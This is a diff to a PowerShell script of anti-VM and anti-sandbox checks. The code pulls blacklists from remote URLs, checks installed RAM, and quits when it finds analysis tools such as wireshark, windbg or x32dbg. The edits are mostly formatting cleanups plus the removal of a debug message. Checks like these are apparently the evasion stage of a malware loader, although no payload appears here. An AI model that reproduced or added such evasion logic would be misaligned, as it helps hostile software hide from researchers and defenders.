@@ -3,7 +3,7 @@ function ShowError {
         [string]$errorName
     )
 
-    Add-Type -AssemblyName System.Windows.Forms;[System.Windows.Forms.MessageBox]::Show("VM/VPS/SANDBOXES ARE NOT ALLOWED ! $errorName",'','OK','Error')
+    Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show("VM/VPS/SANDBOXES ARE NOT ALLOWED ! $errorName", '', 'OK', 'Error')
 
 }
 
@@ -50,7 +50,7 @@ function Invoke-ANTITOTAL {
     }
     foreach ($url in $urls) {
         $blacklist = Invoke-WebRequest -Uri $url -UseBasicParsing | Select-Object -ExpandProperty Content -ErrorAction SilentlyContinue
-        if ($blacklist -ne $null) {
+        if ($null -ne $blacklist) {
             foreach ($item in $blacklist -split "`n") {
                 if ($data -contains $item) {
                     ShowError $item
@@ -64,7 +64,7 @@ function Invoke-ANTITOTAL {
 function ram_check {
     $ram = (Get-WmiObject -Class Win32_PhysicalMemory | Measure-Object -Property capacity -Sum).Sum / 1GB
     if ($ram -lt 4) {
-        Add-Type -AssemblyName System.Windows.Forms;[System.Windows.Forms.MessageBox]::Show('RAM CHECK FAILED !','','OK','Error')
+        Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('RAM CHECK FAILED !', '', 'OK', 'Error')
         Start-Sleep -Seconds 3
         exit
     }
@@ -111,7 +111,7 @@ function VMBYPASSER {
         "vboxcontrol",
         "vmacthlp",
         "vmwareuser",
-	"vt-windows-event-stream",
+        "vt-windows-event-stream",
         "windbg",
         "wireshark",
         "x32dbg",
@@ -124,7 +124,6 @@ function VMBYPASSER {
         Write-Output "Detected processes: $($detectedProcesses -join ', ')"
         Exit 1
     }
-	Invoke-ANTITOTAL
-	Write-Host "[!] NOT A VM" -ForegroundColor Green
+    Invoke-ANTITOTAL
 }
 VMBYPASSER
